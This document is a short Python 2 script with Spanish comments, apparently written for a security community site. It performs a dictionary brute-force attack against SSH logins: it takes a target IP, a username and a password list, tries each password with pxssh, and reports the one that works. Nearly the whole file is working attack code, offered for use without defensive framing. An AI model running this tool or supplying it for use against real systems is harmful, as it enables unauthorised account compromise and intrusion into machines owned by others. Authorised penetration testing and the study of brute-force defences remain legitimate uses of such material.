#!/usr/bin/python
__author__ = 'bett0'
#
#Escrito para http://www.CommunitySec.com/
#
#python sshBrute.py -h [IP/192.168.1.1] -u [USUARIO] -l [Diccionario]
#
#Importando paquete para el manejo del protocolo ssh
import pxssh
from optparse import OptionParser


def sshBrute(host, user, clave):
    s = pxssh.pxssh()
    try:
        #Metodo de conexion de ssh, se necesita la IP, el nombre de usuario y la Clave
        #Si el los datos son correctos mostrara la claves caso contrario,
        #la excepcion se producira y dara el mensaje de clave  incorrecta
        s.login(host, user, clave)
        print('[+] La clave de {0} es: {1}'.format(user, clave))
        return 1
    except pxssh.ExceptionPxssh, e:
        #La excepcion se ejecuta cuando la clave es incorrecta
        print('[-] Intentando con {0}'.format(clave))
        return 0

def main():
    #La clase OptionParse para hacer mas vistoso los datos de entrada.
    parse = OptionParser(' -i [IP/192.168.1.1] -u [USUARIO] -l [Diccionario] ')
    parse.add_option('-i', '--ip',dest='ip',type='string',help='Es la ip a la maquina que atacara')
    parse.add_option('-u', '--user', dest='user', type='string', help='Nombre del usuario.')
    parse.add_option('-l', '--lista', dest='lista', type='string', help='Lista con las posibles claves')

    #Vaiando los datos de entrada en la vairable "opt" y los erroes en la de "errors"
    (opt, errors) = parse.parse_args()

    #Verificar que el dato de IP, Usuario, y lista de las clave sean introducidos,
    if opt.ip == None:
        print parse.usage()
        exit(0)
    else:
        host = opt.ip

    if opt.user == None:
        print parse.usage()
        exit(0)
    else:
        user = opt.user

    if opt.lista == None:
        print parse.usage()
        exit(0)
    else:
        lista = opt.lista

    try:
        #Cuando se introduce el nombre del archivo con las clave
        #Se las vacia en la variable "claves" con with y seguidamente recorremos con un for
        with open(lista,'r') as claves:
            for password in claves:
                try:
                    #Limpiar la variable clave de saltos de linea y de recorrido de carro
                    # Enviar la clave a la funcion sshBrute(IP, USUARIO, CLave)
                    clave = password.strip('\r\n')
                    resp = sshBrute(host, user, clave)
                    if resp == 1:
                        break
                except Exception, err:
                    print('Conectar : {0}'.format(err))
    except Exception, err:
        print('ErrorLista : {0}'.format(err))

if __name__=='__main__':
    main()